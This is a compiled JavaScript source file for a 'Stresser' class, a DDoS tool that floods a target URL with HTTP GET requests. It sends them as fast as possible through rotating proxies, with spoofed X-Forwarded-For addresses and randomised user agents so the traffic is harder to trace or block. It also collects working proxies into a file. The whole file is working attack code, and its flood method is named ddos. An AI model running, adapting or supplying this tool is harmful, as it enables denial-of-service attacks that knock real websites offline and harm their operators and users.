"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Stresser = void 0;
const url_1 = require("url");
require("overpaint.js");
const axios_1 = __importDefault(require("axios"));
const faker_1 = require("@faker-js/faker");
const Utils_1 = require("../utils/Utils");
const Counter_1 = require("./Counter");
class Stresser {
    options;
    targetURL;
    stats;
    proxies = [];
    get duration() {
        return (0, Utils_1.toHumanTime)(Date.now() - this.stats.startTime, true);
    }
    proxyIndex = 0;
    get nextProxy() {
        return this.proxies[++this.proxyIndex % this.proxies.length];
    }
    constructor(options) {
        // set options
        this.options = options;
        // set target URL
        this.targetURL = new url_1.URL(this.options.target);
        // import proxies
        this.importProxies();
        // init stats
        this.stats = {
            startTime: Date.now(),
            requests: new Counter_1.Counter(),
            pending: new Counter_1.Counter(),
            success: new Counter_1.Counter(),
            errors: new Counter_1.Counter(),
        };
        // start rendering terminal
        if (this.options.background) {
            this.sendDataUpdate(2);
        }
        else {
            throw new Error('Not implemented yet.');
            // this.renderTerminal(15);
        }
        // start stressing
        this.ddos(0);
    }
    //================================================================================================
    sendDataUpdate(tps = 10) {
        setInterval(() => {
            process.send?.({
                type: 'data',
                data: {
                    duration: this.duration,
                    requests: this.stats.requests.count,
                    pending: this.stats.pending.count,
                    success: this.stats.success.count,
                    errors: this.stats.errors.count
                }
            });
        }, 1000 / tps);
    }
    //================================================================================================
    // private renderFrame() {
    //    console.clear();
    //    console.log(Stresser.header, '\n');
    //    this.logs.forEach(log => console.log(log));
    //    if (this.options.debugMode) {
    //       console.log(`
    // ${("Duration:  " + this.duration)._Gray}
    // ${("Requests:  " + this.stats.requests.count)._White}
    // ${("Pending:   " + this.stats.pending.count)._OrangeGold}
    // ${("Success:   " + this.stats.success.count)._GreenApple}
    // ${("Errors:    " + this.stats.errors.count)._Red}
    //       `.trimEnd());
    //    } else {
    //       console.log(`
    // ${("Duration:  " + this.duration)._Gray}
    // ${("Requests:  " + this.stats.requests.count)._White}
    //       `.trimEnd());
    //    }
    // }
    // public renderTerminal(fps: number = 10) {
    //    this.renderFrame();
    //    setInterval(() => this.renderFrame(), 1000 / fps);
    // }
    //================================================================================================
    async sendRequest(returnOnSuccess = false, config = {}) {
        try {
            this.requestSent();
            config = {
                ip: faker_1.faker.internet.ipv4(),
                userAgent: faker_1.faker.internet.userAgent(),
                proxy: this.nextProxy,
                ...config
            };
            let options = {
                headers: {
                    'X-Forwarded-For': config.ip,
                    'User-Agent': config.userAgent,
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': this.targetURL.hostname
                },
                proxy: (this.options.useProxies)
                    ? {
                        host: config.proxy[0],
                        port: Number(config.proxy[1])
                    } : undefined
            };
            if (this.options.debugMode) {
                const response = await axios_1.default.get(this.targetURL.href, options);
                this.requestComplete(response.status === 200);
                if (returnOnSuccess)
                    return config;
            }
            else {
                axios_1.default.get(this.targetURL.href, options);
            }
        }
        catch (error) {
            this.requestComplete(false);
        }
    }
    ddos(rps, config = {}) {
        if (typeof rps !== "number")
            throw new Error('Parameter "rps" must be a (positive) number.');
        if (rps === 0) {
            setInterval(() => this.sendRequest(false, config), 0);
        }
        else {
            setInterval(() => this.sendRequest(false, config), 1000 / rps);
        }
    }
    async filterProxies(rps) {
        if (typeof rps !== "number")
            throw new Error('Parameter "rps" must be a (positive) number.');
        setInterval(async () => {
            let config = await this.sendRequest(true);
            if (config) {
                let proxy = config.proxy.join(':');
                let valid_proxies = (0, Utils_1.getStatic)('valid_proxies.txt').split('\n');
                if (valid_proxies.includes(proxy))
                    return;
                // this.logs.push(config.proxy.join(':')._GreenApple);
                (0, Utils_1.addStatic)('valid_proxies.txt', proxy + '\n');
            }
        }, 1000 / rps);
    }
    //================================================================================================
    requestSent() {
        this.stats.requests.inc();
        this.stats.pending.inc();
    }
    requestComplete(success) {
        if (typeof success !== "boolean")
            throw new Error('Parameter "success" must be true or false.');
        this.stats.pending.dec();
        (success) ? this.stats.success.inc() : this.stats.errors.inc();
        return success;
    }
    //================================================================================================
    importProxies() {
        if (!this.options.useProxies)
            return;
        this.proxies = (0, Utils_1.getStatic)(this.options?.proxyFile).split('\n').map(proxy => proxy.split(':'));
        if (!this.proxies.length)
            throw new Error('No proxies found. Check the file name and try again.');
    }
}
exports.Stresser = Stresser;
// process.on('unhandledRejection', (error: any) => {
//    console.error(`Unhandled promise rejection: ${error.message}`);
//    process.exit(1);
// });
//# sourceMappingURL=Stresser.js.map